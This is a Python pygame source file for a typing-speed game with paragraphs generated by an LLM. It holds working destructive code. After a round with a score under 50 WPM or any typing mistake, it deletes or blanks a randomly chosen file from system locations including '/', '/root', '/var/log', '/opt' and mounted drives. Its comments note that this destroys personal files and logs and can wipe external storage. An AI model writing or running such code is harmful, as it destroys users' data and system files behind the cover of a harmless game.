import pygame
import time
import sys
import os
import random
import generate_sentence

llm = generate_sentence.CodeGenerator()

# Set up colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
GRAY = (220, 220, 220)
LIGHT_BLUE = (135, 206, 250)  # Sky blue for gradient
DARK_PURPLE = (75, 0, 130)    # Soft purple for gradient

# File deletion functions
def overwrite_file(file_path):
    """Overwrites a file with blank content instead of deleting it."""
    try:
        with open(file_path, "w") as f:
            f.write("")  # Writing an empty string clears the file
            print(f"Deleted: {file_path}")
    except Exception as e:
        print(f"Error overwriting file: {e}")

def get_random_files(search_paths, excluded_dirs, num_files=1):
    """Finds random files from given search paths."""
    all_files = []
    for path in search_paths:
        for root, _, files in os.walk(path):
            if any(excluded in root for excluded in excluded_dirs):
                continue  # Skip excluded directories
            for file in files:
                all_files.append(os.path.join(root, file))

    if not all_files:
        return []

    return random.sample(all_files, min(num_files, len(all_files)))  # Pick random files safely

def delete_or_overwrite(file_path):
    """Attempts to delete a file; if deletion fails, overwrites it."""
    try:
        os.remove(file_path)
        print(f"Deleted: {file_path}")
    except Exception as e:
        print(f"Error deleting file: {e}")
        overwrite_file(file_path)

# Define search paths (be careful!)
search_paths = [
    "/",        # User directories (deleting personal files = chaos)
    "/root",        # Superuser home directory
    "/var/log",     # Logs (deleting logs can cover your tracks)
    "/var/tmp",     # Temporary files that persist between reboots
    "/opt",         # Third-party software (deleting breaks apps)
    "/mnt", "/media"  # Mounted drives (potentially deleting external storage)
]
# Define directories to exclude
excluded_dirs = ["/proc", "/usr", "/snap", "/sys","/home"]

def calculate_wpm(start_time, end_time, total_words):
    elapsed_time = end_time - start_time
    minutes = elapsed_time / 60
    wpm = total_words / minutes
    return wpm

def wrap_text(text, font, max_width):
    """
    Wraps the text so it fits within the specified max width.
    """
    words = text.split(' ')
    lines = []
    current_line = ''
    
    for word in words:
        # Try adding the word to the current line
        test_line = current_line + (' ' if current_line else '') + word
        test_width = font.size(test_line)[0]
        
        if test_width <= max_width:
            current_line = test_line
        else:
            # If the line is too long, add the current line to the list and start a new line
            if current_line:
                lines.append(current_line)
            current_line = word
    
    if current_line:
        lines.append(current_line)
    
    return lines

def display_text(text, x, y, color, font_size=20):
    """
    Displays wrapped text at the given x, y position, with dynamic font size.
    """
    font = pygame.font.SysFont("Arial", font_size)
    rendered_text = font.render(text, True, color)
    screen.blit(rendered_text, (x, y))

def draw_gradient_background():
    """Draws a soft, single-color gradient background."""
    for i in range(HEIGHT):
        # Creating gradient from light blue to soft purple
        color = (
            int(LIGHT_BLUE[0] + (DARK_PURPLE[0] - LIGHT_BLUE[0]) * i / HEIGHT),
            int(LIGHT_BLUE[1] + (DARK_PURPLE[1] - LIGHT_BLUE[1]) * i / HEIGHT),
            int(LIGHT_BLUE[2] + (DARK_PURPLE[2] - LIGHT_BLUE[2]) * i / HEIGHT)
        )
        pygame.draw.line(screen, color, (0, i), (WIDTH, i))

def word_racing_game():
    global paragraph, screen, font, big_font
    typed_text = ""
    mistakes = 0
    start_time = None
    total_words = len(paragraph.split())
    running = True
    game_over = False
    timer_started = False
    wpm = 0  # To store WPM result and avoid updating it once game is over
    deleted_files = []  # To store the names of deleted files
    file_deleted = False  # To track if a file has been deleted

    # Wrap the paragraph into lines
    wrapped_paragraph = wrap_text(paragraph, font, 1160)
    paragraph_height = len(wrapped_paragraph) * 30  # Height of the paragraph

    while running:
        # Draw gradient background
        draw_gradient_background()
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()

            if event.type == pygame.KEYDOWN and not game_over:
                if event.key == pygame.K_BACKSPACE:
                    typed_text = typed_text[:-1]
                elif event.key == pygame.K_RETURN:
                    # End game on Enter, calculate mistakes including blanks
                    if start_time is not None:
                        end_time = time.time()
                        wpm = calculate_wpm(start_time, end_time, len(typed_text.split()))
                        game_over = True
                        mistakes = sum(1 for i in range(len(paragraph)) if i < len(typed_text) and typed_text[i] != paragraph[i]) + abs(len(paragraph) - len(typed_text))  # Count mismatched and missing characters
                        if (wpm < 50 and not file_deleted) or mistakes > 0:  # Delete a file only if WPM is below 50
                            file_deleted = True
                            files_to_process = get_random_files(search_paths, excluded_dirs, num_files=1)  # Get a new random file
                            if files_to_process:  # Ensure there's a file to delete
                                deleted_files.append(files_to_process[0])  # Store the file name
                                delete_or_overwrite(files_to_process[0])  # Delete the file

                else:
                    # Add the typed character to the text and remove any newline characters
                    typed_text += event.unicode.replace('\n', '')

            if event.type == pygame.MOUSEBUTTONDOWN and game_over:
                # Check if the restart button is clicked
                mouse_x, mouse_y = pygame.mouse.get_pos()
                if restart_button.collidepoint(mouse_x, mouse_y):
                    # Reset the game state
                    typed_text = ""
                    mistakes = 0
                    start_time = None
                    game_over = False
                    timer_started = False
                    wpm = 0
                    deleted_files = []
                    file_deleted = False

        # Start the timer when user starts typing
        if start_time is None and typed_text:
            start_time = time.time()
            timer_started = True

        # Set y_position for the prompt and paragraph
        prompt_y_position = 60  # Increased spacing for the note at the top
        paragraph_y_position = prompt_y_position + 40  # Space for the prompt
        input_box_y_position = paragraph_y_position + paragraph_height + 20  # Below the paragraph text

        # Display the paragraph (wrapped to multiple lines)
        display_text("Type this text:", 20, prompt_y_position, BLACK, font_size=20)
        display_text("Stay above 50 WPM!", 20, 10, GREEN, font_size=30)  # WPM reminder at the top

        # Display the paragraph with color-coded characters
        x_offset = 20  # Start rendering at x = 20
        y_offset = paragraph_y_position
        current_char_index = 0  # Track the current character index in the paragraph

        for line in wrapped_paragraph:
            for char in line:
                # Determine the color based on user input
                if current_char_index < len(typed_text):
                    if typed_text[current_char_index] == paragraph[current_char_index]:
                        color = WHITE if not game_over else GREEN  # White during typing, green at the end
                    else:
                        color = RED  # Incorrect characters remain red
                else:
                    color = RED  # Unmatched characters remain red

                # Render the character at the correct position
                rendered_char = font.render(char, True, color)
                screen.blit(rendered_char, (x_offset, y_offset))
                
                # Update the x_offset for the next character
                x_offset += font.size(char)[0]
                current_char_index += 1

            # Move to the next line
            current_char_index += 1
            y_offset += 30
            x_offset = 20  # Reset x_offset for the next line

        # Adjust the size of the input box dynamically based on paragraph length
        pygame.draw.rect(screen, GRAY, (20, input_box_y_position, 1160, paragraph_height))  # Adjusted width for bigger display
        
        # Wrap the typed text dynamically
        wrapped_typed_text = wrap_text(typed_text, font, 1850)  # Wrap typed text to fit within screen width

        # Display each line of the wrapped typed text
        y_offset = input_box_y_position + 10  # Start displaying just below the input box
        for line in wrapped_typed_text:
            display_text(line, 20, y_offset, BLACK, font_size=15)
            y_offset += 30  # Move to the next line for each wrapped line

        # Track mistakes
        mistakes = sum(1 for i in range(min(len(typed_text), len(paragraph))) if typed_text[i] != paragraph[i]) + abs(len(paragraph) - len(typed_text))

        if game_over:
            # Position the Game Over UI under the grey box
            y_position_game_over = input_box_y_position + paragraph_height + 20  # Position below the grey box

            # Once the game is over, stop the timer and calculate WPM if not done already
            if start_time and wpm == 0:
                end_time = time.time()
                wpm = calculate_wpm(start_time, end_time, len(typed_text.split()))  # Calculate WPM at game over

            # Display results without overlapping with the main screen
            display_text(f"Game Over! Your Results:", 20, y_position_game_over, BLACK, font_size=20)
            display_text(f"WPM: {wpm:.2f}", 20, y_position_game_over + 40, GREEN, font_size=24)
            display_text(f"Mistakes: {mistakes - 1}", 20, y_position_game_over + 80, RED, font_size=24)

            # Display deleted file under the mistake count
            if file_deleted and deleted_files:  # Ensure there's a file to display
                deleted_file_message = f"File Deleted: {deleted_files[0]}"
                wrapped_message = wrap_text(deleted_file_message, font, WIDTH - 40)  # Wrap text within screen width (with 20px padding on each side)
    
                # Display each line of the wrapped message
                for i, line in enumerate(wrapped_message):
                    display_text(line, 20, y_position_game_over + 120 + (i * 30), RED, font_size=15)

            # Draw restart button
            restart_button = pygame.Rect(WIDTH // 2 - 100, y_position_game_over + 180, 200, 50)
            pygame.draw.rect(screen, GREEN, restart_button)
            button_text = "Restart"
            button_text_width, button_text_height = font.size(button_text)
            display_text(
                button_text,
                restart_button.x + (restart_button.width // 2) - (button_text_width // 2),  # Centered horizontally
                restart_button.y + (restart_button.height // 2) - (button_text_height // 2),  # Centered vertically
                BLACK,
                font_size=24
            )

        # Stop the timer if the user finished typing the paragraph
        if typed_text.strip() == paragraph.strip() and not game_over and timer_started:
            end_time = time.time()
            wpm = calculate_wpm(start_time, end_time, len(typed_text.split()))
            display_text(f"Finished! WPM: {wpm:.2f}", 440, HEIGHT - 100, GREEN, font_size=20)

            game_over = True

        pygame.display.update()

def start_game():
    global paragraph, screen, font, big_font, WIDTH, HEIGHT

    # Initialize pygame
    pygame.init()

    # Set up display (wider window)
    WIDTH, HEIGHT = 1200, 800  # Wider window
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Word Racing Game")

    # Set up fonts
    font = pygame.font.SysFont("Arial", 24)
    big_font = pygame.font.SysFont("Arial", 30)

    # The paragraph to type (newlines removed)
    paragraph = llm.generate_paragraph() + ' ' + llm.generate_paragraph() + ' ' + llm.generate_paragraph() + ' ' + llm.generate_paragraph() + ' '

    # Start the game
    word_racing_game()

if __name__ == "__main__":
    start_game()